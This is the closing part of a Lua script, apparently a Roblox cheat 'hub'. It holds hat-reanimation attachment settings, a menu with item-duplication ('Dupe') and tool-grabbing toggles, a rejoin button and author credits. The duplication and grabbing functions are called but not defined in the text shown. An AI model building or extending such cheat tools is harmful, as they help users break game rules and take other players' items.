            Hats.torso1.Handle.Attachment.Rotation = Vector3.new(90, 101.38, 90) --torso/black hair
                Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(21.09, 0, 0) --rightarm/Hat1
                Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(21.09, 0, 0) --leftarm/palhair
                Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(13.18, 34.16, 8.79) --rightleg/lavenderhair
                Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(13.18, -34.16, -8.79) --leftleg/pink hair
                Hats.but1.Handle.Attachment.Rotation = Vector3.new(14.28, 0, 0) --but1/fedora
                Hats.but2.Handle.Attachment.Rotation = Vector3.new(14.28, 0, 0) --but2/mesh
                Hats.bob1.Handle.Attachment.Rotation = Vector3.new(-15, 0, 0) --bob1/mars
            Hats.bob2.Handle.Attachment.Rotation = Vector3.new(-15, 0, 0) --bob2/uranus
                
            att2.Position = Vector3.new(0, 0.7, -1.988)
            att2.Rotation = Vector3.new(-8.98, 180, 0)
           toggle = true
 else
                Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(0, 0.696, -1.553) --torso/black hair
                Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.355, 1.199, -0.838) --rightarm/Hat1
                Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(1.355, 1.199, -0.838) --leftarm/palhair
                Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-1.021, -0.814, -0.517) --rightleg/lavenderhair
                Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(1.021, -0.814, -0.517) --leftleg/pink hair
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-0.523, -0.689, -1.743) --but1/fedora
                Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(0.523, -0.689, -1.743) --but2/mesh
                Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-0.509, 1.315, -1.045) --bob1/mars
            Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(0.509, 1.315, -1.045) --bob2/uranus
            
            Hats.torso1.Handle.Attachment.Rotation = Vector3.new(90, 101.38, 90) --torso/black hair
                Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(2.27, 0, 0) --rightarm/Hat1
                Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(2.27, 0, 0) --leftarm/palhair
                Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(4.87, 36.91, 8.59) --rightleg/lavenderhair
                Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(4.87, -36.91, -8.59) --leftleg/pink hair
                Hats.but1.Handle.Attachment.Rotation = Vector3.new(14.28, 0, 0) --but1/fedora
                Hats.but2.Handle.Attachment.Rotation = Vector3.new(14.28, 0, 0) --but2/mesh
                Hats.bob1.Handle.Attachment.Rotation = Vector3.new(-15, 0, 0) --bob1/mars
            Hats.bob2.Handle.Attachment.Rotation = Vector3.new(-15, 0, 0) --bob2/uranus


            att2.Position = Vector3.new(0, 1, -1.988)
            att2.Rotation = Vector3.new(-1.58, 180, 0)
            toggle = false
        end
    end
end)
end)

local misc = UI:addPage("misc",1,false,6)

-- [ misc ] --

misc:addLabel("good new's","Dupe is now FIXED")

misc:addTextBox("Dupe","do 5",function(amount)
    game.StarterGui:SetCore("SendNotification",{
        Title = "note";
        Text = "Duping "..amount 
    })
    Dupe(amount)
end)



misc:addToggle("grabtools!",function(value)
    if value == true then 
        game.StarterGui:SetCore("SendNotification",{
            Title = "Toggle";
            Text = "grabbing tools is actvie!";

        })
        grabtools()
    else 
        game.StarterGui:SetCore("SendNotification",{
            Title = "Toggle";
            Text = "grabtools has stopped..";
        })
        ungrabtools()
    end
end)



misc:addButton("rejoin game",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "wait";
        Text = "Rejoinning!";
    })
    wait(0.2)
    game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
end)

local credits = UI:addPage("credits",1,false,9)

credits:addLabel("this hub was made by khlat and makram dacca ", "klat on top!")

credits:addLabel("social media for khlat :", "khlat#0089 on discord")

credits:addLabel("social media for khlat :", "dream0_77777777777 on roblox")

credits:addLabel("social media for makram :", "DARK16#7037 on discord")

credits:addLabel("social media for makram :", "mkrm dacca on yt")

credits:addLabel("social media for makram :", "makram12345 on roblox")

end
